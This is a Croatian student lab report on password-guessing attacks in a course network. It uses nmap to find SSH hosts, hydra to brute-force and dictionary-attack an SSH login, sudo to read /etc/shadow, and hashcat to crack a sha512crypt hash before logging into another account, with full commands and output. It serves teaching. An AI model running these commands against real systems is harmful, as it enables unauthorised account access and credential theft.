# 5. Laboratorijska vježba

## **Online and Offline Password Guessing Attacks**

---

### Online Password Guessing

Pomoću alata *nmap* provjeravamo koji su portovi otvoreni na računalima na lokalnoj mreži te otkrivamo što možemo potencijalno napadati. 

- provjeravamo 16 IP adresa → `nmap -v 10.0.15.0/28`

```bash
Nmap scan report for 10.0.15.1
Host is up (0.0076s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.15.2
Host is up (0.0094s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.15.3
Host is up (0.0053s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.15.4
Host is up (0.0073s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.15.5
Host is up (0.0024s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.15.6
Host is up (0.0064s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.15.7
Host is up (0.0049s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.15.8
Host is up (0.0052s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.15.9
Host is up (0.0076s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.15.10
Host is up (0.0085s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 10.0.15.11
Host is up (0.0071s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Read data files from: /usr/bin/../share/nmap
Nmap done: 16 IP addresses (12 hosts up) scanned in 16.92 seconds
```

- *nmap* nam daje informacije da je aktivno 12 *hostova* i da je na svima otvoren port 22 za SSH (Secure Shell)
- SSH omogućuje otvaranje terminala na udaljenom računalu pa će na upravo on poslužiti kako bi izvršili online napad
- kako bi se mogli prijaviti na vlastiti SSH moramo znati password odnosno moramo ga probiti vršeći online napad na vlastiti račun
- ono što znamo je da se naš *password* sastoji od 4 do 6 znakova i da su sve mala slova engleske abecede što nas vodi do zaključka da je maksimalan broj mogućih *passworda* jednak sumi od i=4 do i=6 od 26^i, a to je približno jednako 26^6
- otkrivanje *passworda* započinjamo sa brute force napadom i za to koristimo *hydru →* `hydra -l dumic_veronika -x 4:6:a 10.0.15.5 -V -t 1 ssh`
- na ovaj način testiramo sve moguće kombinacije iz *key space-a*

```bash
[DATA] max 1 task per 1 server, overall 1 task, 321254128 login tries (l:1/p:321254128), ~321254128 tries per task
[DATA] attacking ssh://10.0.15.5:22/
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaaa" - 1 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaab" - 2 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaac" - 3 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaad" - 4 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaae" - 5 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaaf" - 6 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaag" - 7 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaah" - 8 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaai" - 9 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaaj" - 10 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaak" - 11 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaal" - 12 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaam" - 13 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaan" - 14 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaao" - 15 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.5 - login "dumic_veronika" - pass "aaap" - 16 of 321254128 [child 0] (0/0)
[STATUS] 16.00 tries/min, 16 tries in 00:01h, 321254112 to do in 334639:43h, 1 active
```

- iako bi ovakvim napadom sigurno otkrili *password* problem je što bi on predugo trajao i zato moramo upotrijebiti drugačiji pristup, odnosno koristit ćemo unaprijed sastavljen *dictionary* u kojem se nalaze potencijalni *passwordi*
- skidamo *dictionary* → `wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g2/`
- `hydra -l dumic_veronika -P dictionary/g2/dictionary_online.txt 10.0.15.5 -V -t 4 ssh` → započinjemo napad

```bash
[22][ssh] host: 10.0.15.5   login: dumic_veronika   password: psengr
[STATUS] 872.00 tries/min, 872 tries in 00:01h, 1 to do in 00:01h, 1 active
1 of 1 target successfully completed, 1 valid password found
Hydra ([http://www.thc.org/thc-hydra](http://www.thc.org/thc-hydra)) finished at 2021-12-20 16:40:31
```

- otkrivena je lozinka s kojom se sada možemo ulogirati u SSH → `ssh dumic_veronika@10.0.15.5`

```bash
dumic_veronika@host_dumic_veronika:~$ whoami
dumic_veronika
```

- kada smo se uspješno ulogirali u SSH želimo pristupiti udaljenom serveru gdje je sva komunikacija enkriptirana

```bash
dumic_veronika@host_dumic_veronika:~$ sudo cat /etc/shadow
[sudo] password for dumic_veronika:
root:*:18900:0:99999:7:::
daemon:*:18900:0:99999:7:::
bin:*:18900:0:99999:7:::
sys:*:18900:0:99999:7:::
sync:*:18900:0:99999:7:::
games:*:18900:0:99999:7:::
man:*:18900:0:99999:7:::
lp:*:18900:0:99999:7:::
mail:*:18900:0:99999:7:::
news:*:18900:0:99999:7:::
uucp:*:18900:0:99999:7:::
proxy:*:18900:0:99999:7:::
www-data:*:18900:0:99999:7:::
backup:*:18900:0:99999:7:::
list:*:18900:0:99999:7:::
irc:*:18900:0:99999:7:::
gnats:*:18900:0:99999:7:::
nobody:*:18900:0:99999:7:::
_apt:*:18900:0:99999:7:::
systemd-network:*:18977:0:99999:7:::
systemd-resolve:*:18977:0:99999:7:::
messagebus:*:18977:0:99999:7:::
sshd:*:18977:0:99999:7:::
dumic_veronika:$6$XomcV3MjrPlXa39U$0B2acmxUcRqnDXgwRJKDIvS9ValauZLJL.7PriSHyzhFNLwnUapt854K4E.aYZlQcK8YjrtKIl0ShCPc98Wc7/:18981:0:99999:7:::
jean_doe:$6$Zv//yCIF5YSrWJuE$jHHehJrYDVjuzgFMwYFpq9sEBn2AHyufdKjm8eSIwE5K/keGNgthiSYca7dIvTYlBwU6Vs727crhgesSYH9aP/:18981:0:99999:7:::
john_doe:$6$LeNF/QHW1ojBCFmz$Ykeu3MLee/ITjHX9mY9rjJ/eRBJj7BfOEe0FtBUOoWjZmnZoH23dPbs6viRme6.fniNmM5P.68WZqdKnU8ABo1:18981:0:99999:7:::
alice_cooper:$6$l2pyqDlUMkhPSLFE$GHN0c9j9avgEErkBTKWOeLzNHd3cjM72j8jYdyREvD42Z0Pd9jFX1K32xvHBqQUwxB8mdSVVrjMhcGYDbUkS8.:18981:0:99999:7:::
john_deacon:$6$SE7722na7T8j9OMB$oMAIbL9a6f2w4EhYq2V0yW3T6xvDM1vAEEWCDXf1gjeu2fefMCa4rL97gfn/uwgFlYVvw2q9oEofjV3xIJJL./:18981:0:99999:7:::
freddie_mercury:$6$/bV3KzD6CKi2lHVo$B3kH88KK/KgmdbJB2Zw2N4uhvoKvypSma7t1zZ6Xd26r0kcG7w.bRBZnSaKcUrLkWQkq1UhViVcEITgMvvzTX1:18981:0:99999:7:::
```

- sada imamo pristup *hashiranim* lozinkama korisnika i možemo raditi offline napad

---

### Offline Password Guessing

Pomoću alata *hashcat* želimo iz *hash* vrijednosti *passworda* dobiti izvorni *password*. *Passwordi* su *hashirani* na način da je prvo definirana *hash* funckija koja se koristi, zatim je navedena sol te na kraju sama *hash* vrijednost *passworda.*

- za početak ćemo pokušati koristit brute force napad

```bash
Session..........: hashcat
Status...........: Running
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$LeNF/QHW1ojBCFmz$Ykeu3MLee/ITjHX9mY9rjJ/eRBJj7Bf...U8ABo1
Time.Started.....: Mon Dec 20 17:01:51 2021 (1 min, 20 secs)
Time.Estimated...: Sun Jan 16 12:56:20 2022 (26 days, 19 hours)
Guess.Mask.......: ?l?l?l?l?l?l [6]
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:      133 H/s (10.37ms)
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 10560/308915776 (0.00%)
Rejected.........: 0/10560 (0.00%)
Restore.Point....: 320/11881376 (0.00%)
Candidates.#1....: fnffie -> fyiner
HWMon.Dev.#1.....: N/A
```

- na ovaj način bi sigurno otkrili *password* međutim za to bi nam trebalo 30ak dana, a mi nemamo toliko vremena
- sada ćemo koristiti već sastavljeni *dictionary* za ovaj offline napad → `hashcat --force -m 1800 -a 0 hash.txt dictionary/g2/dictionary_offline.txt -- status --status-timer 10`
- u datoteci hash.txt nalazi se *hash* vrijednost iz koje želimo otkriti *password*

```bash
$6$LeNF/QHW1ojBCFmz$Ykeu3MLee/ITjHX9mY9rjJ/eRBJj7BfOEe0FtBUOoWjZmnZoH23dPbs6viRme6.fniNmM5P.68WZqdKnU8ABo1:finoou

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$LeNF/QHW1ojBCFmz$Ykeu3MLee/ITjHX9mY9rjJ/eRBJj7Bf...U8ABo1
Time.Started.....: Mon Dec 20 17:07:07 2021 (6 mins, 3 secs)
Time.Estimated...: Mon Dec 20 17:13:10 2021 (0 secs)
Guess.Base.......: File (dictionary/g2/dictionary_offline.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:      114 H/s (11.01ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 45440/50072 (90.75%)
Rejected.........: 0/45440 (0.00%)
Restore.Point....: 45312/50072 (90.49%)
Candidates.#1....: finoou -> kekntj
HWMon.Dev.#1.....: N/A

Started: Mon Dec 20 17:07:06 2021
Stopped: Mon Dec 20 17:13:11 2021
```

- pronađen je *password* računa john_doe te se sad pomoću njega možemo ulogirati u navedeni račun → `ssh john_doe@10.0.15.5`
- uspješno smo se ulogirali

```bash
john_doe@host_dumic_veronika:~$ whoami
john_doe
```

---

### Zaključak

Oba napada, online i offline napad, trajali bi predugo da nismo imali unaprijed sastavljen *dictionary*. Upravo je to ono što će demotivirati napadača i povećati sigurnost naše lozinke. Kod online napada dobro je to što se direktno mogu isprobavati lozinke i dobiva se odgovor od servera je li prijava uspješno prošla, dok kod offline napada ne dobivamo povratne informacije dok se ne pokušamo ručno prijaviti u račun. Također kod *hashiranih* lozinki mogli smo vidjeti da se koristi i sol koja uz iterativno *hashiranje* povećava razinu sigurnosti.
